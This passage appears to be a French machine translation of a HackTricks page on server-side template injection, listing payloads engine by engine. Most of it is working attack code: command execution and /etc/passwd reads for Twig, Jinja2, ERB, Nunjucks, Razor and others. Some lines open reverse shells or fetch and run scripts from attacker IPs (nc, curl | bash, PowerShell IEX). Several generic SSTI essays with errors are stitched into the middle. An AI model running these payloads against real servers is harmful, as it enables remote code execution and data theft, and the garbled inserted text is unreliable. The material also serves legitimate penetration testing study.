{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - Format de template**

Twig is a template engine for PHP that is used by many popular PHP frameworks, such as Symfony, Laravel, and Drupal. It is also used by some SaaS platforms, such as Shopify and CraftCMS.

Twig uses a syntax similar to Django templates and Jinja2 templates. It is a powerful and flexible template engine that allows developers to create complex templates with ease.

Some of the features of Twig include:

- Template inheritance
- Macros
- Filters
- Functions
- Automatic HTML escaping
- Caching

One of the most important things to keep in mind when using Twig is to properly sanitize any user input that is used in a template. Failure to do so can lead to server-side template injection vulnerabilities, which can allow an attacker to execute arbitrary code on the server.

Overall, Twig is a great choice for developers who want a powerful and flexible template engine that is easy to use and integrates well with popular PHP frameworks.
```php
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```
**Plus d'informations**

* Dans la section Twig et Twig (Sandboxed) de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates est inspir√© de Twig mais est un moteur de template PHP natif au lieu d'un moteur de template compil√©.

contr√¥leur:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
# Injection de mod√®le c√¥t√© serveur (SSTI)

L'injection de mod√®le c√¥t√© serveur (SSTI) est une vuln√©rabilit√© qui permet √† un attaquant d'injecter du code dans un mod√®le c√¥t√© serveur. Cette vuln√©rabilit√© peut √™tre exploit√©e pour ex√©cuter du code √† distance, acc√©der √† des donn√©es sensibles ou prendre le contr√¥le du serveur.

## Comment √ßa fonctionne

Les mod√®les sont utilis√©s pour g√©n√©rer des pages Web dynamiques. Les mod√®les peuvent contenir des variables qui sont remplac√©es par des valeurs sp√©cifiques lorsqu'une page est g√©n√©r√©e. Les SSTI se produisent lorsque les variables du mod√®le sont mal g√©r√©es et qu'un attaquant peut injecter du code dans le mod√®le.

## Exploitation

Les SSTI peuvent √™tre exploit√©s de diff√©rentes mani√®res, en fonction de la technologie utilis√©e pour g√©n√©rer les mod√®les. Les attaquants peuvent utiliser des balises sp√©ciales pour injecter du code dans les mod√®les. Par exemple, dans les mod√®les Jinja2, les attaquants peuvent utiliser la balise `{{ }}` pour injecter du code.

Voici un exemple de code malveillant qui peut √™tre inject√© dans un mod√®le Jinja2:

```
{{config.items()[0]}}
```

Ce code malveillant peut √™tre utilis√© pour acc√©der √† des donn√©es sensibles, telles que les informations d'identification de la base de donn√©es.

## Pr√©vention

Pour pr√©venir les SSTI, il est important de valider toutes les entr√©es utilisateur qui sont utilis√©es pour g√©n√©rer des mod√®les. Les d√©veloppeurs doivent s'assurer que les variables du mod√®le sont correctement √©chapp√©es pour emp√™cher l'injection de code.

## R√©f√©rences

- [OWASP Server-Side Template Injection](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS))
- [Jinja2 Documentation](https://jinja.palletsprojects.com/en/2.11.x/templates/)
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
# Injection de mod√®le c√¥t√© serveur (SSTI)

L'injection de mod√®le c√¥t√© serveur (SSTI) est une vuln√©rabilit√© qui permet √† un attaquant d'injecter du code dans un mod√®le c√¥t√© serveur. Cette vuln√©rabilit√© peut √™tre exploit√©e pour ex√©cuter du code arbitraire sur le serveur.

## Comment cela fonctionne-t-il?

Les mod√®les sont utilis√©s pour g√©n√©rer des pages Web dynamiques. Les mod√®les peuvent contenir des variables qui sont remplac√©es par des valeurs lorsqu'une page est g√©n√©r√©e. Les SSTI se produisent lorsque les variables sont mal valid√©es et qu'un attaquant peut injecter du code dans le mod√®le.

## Exploitation

Les SSTI peuvent √™tre exploit√©s de diff√©rentes mani√®res, en fonction de la technologie utilis√©e pour g√©n√©rer les mod√®les. Les attaquants peuvent utiliser des balises sp√©ciales pour injecter du code dans les mod√®les. Par exemple, dans les mod√®les Jinja2, les attaquants peuvent utiliser la balise `{{ }}` pour injecter du code.

Voici un exemple de code vuln√©rable en Python utilisant Jinja2:

```python
from jinja2 import Template

template = Template('Hello {{name}}!')
output = template.render(name='John')
print(output)
```

Dans cet exemple, l'utilisateur fournit une valeur pour la variable `name`. Si l'utilisateur fournit une valeur malveillante, il peut injecter du code dans le mod√®le. Par exemple, si l'utilisateur fournit la valeur `{{2+2}}`, le mod√®le g√©n√©r√© sera `Hello 4!`.

## Pr√©vention

Pour pr√©venir les SSTI, il est important de valider toutes les entr√©es utilisateur. Les d√©veloppeurs doivent s'assurer que les variables sont correctement valid√©es avant d'√™tre utilis√©es dans les mod√®les. Les frameworks de d√©veloppement Web modernes, tels que Flask et Django, ont des m√©canismes int√©gr√©s pour pr√©venir les SSTI. Les d√©veloppeurs doivent √©galement s'assurer que les mod√®les sont stock√©s en toute s√©curit√© et que les utilisateurs n'ont pas acc√®s aux fichiers de mod√®le.
```html
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```
### PHPlib et HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) est identique √† PHPlib mais port√© sur Pear.

`authors.tpl`
```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```
# `authors.php`

## Description

La page `authors.php` affiche une liste d'auteurs avec leurs noms et leurs biographies. Elle est vuln√©rable √† une injection de mod√®le c√¥t√© serveur (SSTI) en raison d'une mauvaise validation des entr√©es utilisateur.

## Impact

Un attaquant peut exploiter cette vuln√©rabilit√© pour ex√©cuter du code arbitraire sur le serveur, ce qui peut entra√Æner la divulgation de donn√©es sensibles, la prise de contr√¥le du serveur ou d'autres attaques.

## Exploitation

L'exploitation de cette vuln√©rabilit√© d√©pend du langage de mod√®le utilis√© par l'application. Les exemples suivants montrent comment exploiter cette vuln√©rabilit√© en utilisant diff√©rents langages de mod√®le.

### Jinja2

```
http://example.com/authors.php?name={{7*7}}
```

### Twig

```
http://example.com/authors.php?name={{7*7}}
```

### Freemarker

```
http://example.com/authors.php?name=<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### Velocity

```
http://example.com/authors.php?name=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()
```

### Handlebars

```
http://example.com/authors.php?name={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}${{this.pop}}(id){{/with}}{{/with}}{{/with}}
```

### EJS

```
http://example.com/authors.php?name=<% require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) }); %>
```

### ERB

```
http://example.com/authors.php?name=<%= system("id") %>
```

### Mustache

```
http://example.com/authors.php?name={{#0}}{{.}}{{$a:=&a}}{{/0}}{{$a["0"].constructor("return process")().env.id}}
```

### Smarty

```
http://example.com/authors.php?name={$smarty.version}
```

## Contre-mesures

La meilleure fa√ßon de se prot√©ger contre les attaques SSTI est de ne pas utiliser d'entr√©es utilisateur directement dans les mod√®les. Si cela n'est pas possible, il est important de valider et de filtrer soigneusement les entr√©es utilisateur pour s'assurer qu'elles ne contiennent pas de code malveillant.
```php
<?php
//we want to display this author list
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade est un moteur de template pour Node.js qui permet de g√©n√©rer du HTML dynamique. Il est vuln√©rable aux attaques SSTI si les entr√©es utilisateur ne sont pas correctement valid√©es et √©chapp√©es.

Pour exploiter une vuln√©rabilit√© SSTI dans Jade, vous pouvez utiliser la syntaxe `#{}` pour ex√©cuter du code arbitraire. Par exemple, si vous avez une variable `userInput` qui contient du code malveillant, vous pouvez l'injecter dans un template Jade comme ceci :

```
p Welcome #{userInput}
```

Si `userInput` contient du code qui peut √™tre ex√©cut√©, il sera ex√©cut√© lors de la g√©n√©ration de la page.

Pour √©viter les attaques SSTI dans Jade, vous devez toujours valider et √©chapper les entr√©es utilisateur avant de les utiliser dans un template.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Plus d'informations**

* Dans la section Jade de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) est un moteur de template PHP qui ne compile pas et utilise des balises XML pour diviser un document en diff√©rentes parties.
```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

Traversal de chemin d'acc√®s (plus d'informations [ici](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Erreur
* ${7\*7} = ${7\*7}
* Rien
```java
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
**Plus d'informations**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Mod√®le** | **Description**                         |
| ------------ | --------------------------------------- |
|              | √âvaluer et rendre la sortie              |
|              | √âvaluer et rendre la sortie encod√©e en HTML |
|              | Commentaire                                 |
| et          | Autoriser le code (d√©sactiv√© par d√©faut)        |

* \= 49

**C√¥t√© client**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**C√¥t√© Serveur**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Plus d'informations**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Exemple de rendu c√¥t√© serveur**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Plus d'informations**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Aucune sortie
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Erreur
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Plus d'informations**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Erreur`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Plus d'informations**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Plus d'informations**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Consultez la page suivante pour apprendre des astuces sur la **bypass d'ex√©cution de commandes arbitraires en contournant les sandbox** en python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Erreur`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Plus d'informations**

### Jinja2 (Python)

[Site officiel](http://jinja.pocoo.org)

> Jinja2 est un moteur de template complet pour Python. Il prend en charge l'unicode complet, un environnement d'ex√©cution sandbox√© int√©gr√© en option, est largement utilis√© et sous licence BSD.

* `{{7*7}} = Erreur`
* `${7*7} = ${7*7}`
* `{{foobar}} Rien`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Format de template**

Jinja2 est un moteur de template pour Python. Il est utilis√© pour g√©n√©rer des pages HTML, des courriels et d'autres types de documents. Les templates Jinja2 sont des fichiers texte qui contiennent des balises et des variables. Les balises sont utilis√©es pour contr√¥ler la logique de la page, tandis que les variables sont utilis√©es pour afficher des donn√©es dynamiques.

Les balises Jinja2 sont entour√©es de `{%` et `%}`. Les variables sont entour√©es de `{{` et `}}`. Les commentaires sont entour√©s de `{#` et `#}`.

Voici un exemple de template Jinja2 simple :

```
<!DOCTYPE html>
<html>
  <head>
    <title>{{ title }}</title>
  </head>
  <body>
    <h1>{{ heading }}</h1>
    {% for item in items %}
      <p>{{ item }}</p>
    {% endfor %}
  </body>
</html>
```

Dans cet exemple, `title` et `heading` sont des variables, tandis que `for` est une balise. La boucle `for` it√®re sur la liste `items` et affiche chaque √©l√©ment dans un paragraphe.

Les templates Jinja2 peuvent √©galement inclure des fichiers externes, des macros et des filtres personnalis√©s pour une plus grande flexibilit√©.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
{% endraw %}


```
[**RCE ind√©pendant de**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Plus de d√©tails sur comment abuser de Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= Succ√®s`
* `@() <= Succ√®s`
* `@("{{code}}") <= Succ√®s`
* `@ <= Succ√®s`
* `@{} <= ERREUR!`
* `@{ <= ERREUR!`
* `@(1+2)`
* `@( //CodeC# )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBXAHMAaABlACAAdABlAHMAdABtAGUAdAA2ADQALgBlAHgAZQA7ACAARGV2aWNlAA==");`

    La m√©thode `System.Diagnostics.Process.Start` de .NET peut √™tre utilis√©e pour d√©marrer n'importe quel processus sur le serveur et ainsi cr√©er un shell web. Vous pouvez trouver un exemple d'application web vuln√©rable sur [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Plus d'informations**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Rien
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Plus d'informations**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

M√™me s'il s'agit de Perl, il utilise des balises comme ERB en Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Erreur`
```
<%= perl code %>
<% perl code %>
```
### SSTI en GO

Pour confirmer que le moteur de template utilis√© dans le backend est Go, vous pouvez utiliser ces charges utiles :

* `{{ . }}` = structure de donn√©es transmise en entr√©e au mod√®le
  * Si les donn√©es transmises sont un objet qui contient l'attribut Password par exemple, la charge utile pr√©c√©dente le divulguerait, mais vous pourriez √©galement faire : `{{ .Password }}`
* `{{printf "%s" "ssti" }}` = devrait afficher la cha√Æne ssti dans la r√©ponse
* `{{html "ssti"}}`, `{{js "ssti"}}` = Ce sont quelques autres charges utiles qui devraient afficher la cha√Æne "ssti" sans les mots de fin "js" ou "html". Vous pouvez vous r√©f√©rer √† plus de mots-cl√©s dans le moteur [ici](https://golang.org/pkg/text/template).

**Exploitation de XSS**

Si le serveur utilise le package **text/template**, il est tr√®s facile de r√©aliser une XSS en fournissant simplement votre charge utile en entr√©e. Cependant, ce n'est pas le cas avec **html/template** car il encode la r√©ponse en HTML : `{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

Cependant, Go permet de **D√âFINIR** un **mod√®le** complet et de l'appeler **plus tard**. La charge utile sera quelque chose comme :\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**Exploitation de RCE**

La documentation pour les modules html/template et text/template peut √™tre trouv√©e [ici](https://golang.org/pkg/html/template/) et [ici](https://golang.org/pkg/text/template/), et oui, ils varient beaucoup. Par exemple, dans **text/template**, vous pouvez **appeler directement n'importe quelle fonction publique avec la valeur "call"**, ce qui n'est pas le cas avec html/template.

Si vous voulez trouver une RCE en go via SSTI, vous devriez savoir que comme vous pouvez acc√©der √† l'objet donn√© au mod√®le avec `{{ . }}`, vous pouvez √©galement **appeler les m√©thodes des objets**. Ainsi, imaginez que l'**objet transmis a une m√©thode appel√©e System** qui ex√©cute la commande donn√©e, vous pourriez l'abuser avec : `{{ .System "ls" }}`\
Par cons√©quent, vous aurez probablement **besoin du code source**. Un code source potentiel pour quelque chose comme √ßa ressemblera √† :
```go
func (p Person) Secret (test string) string {
	out, _ := exec.Command(test).CombinedOutput()
	return string(out)
}
```
**Plus d'informations**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Plus d'exploits

Consultez le reste de [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) pour plus d'exploits. Vous pouvez √©galement trouver des informations int√©ressantes sur les balises dans [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Aide connexe

Si vous pensez que cela pourrait √™tre utile, lisez:

* [Astuces Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Fonctions magiques Python](broken-reference/)

## Outils

{% embed url="https://github.com/epinna/tplmap" %}

## Liste de d√©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pratique et r√©f√©rences

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) est l'√©v√©nement de cybers√©curit√© le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congr√®s est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybers√©curit√© dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
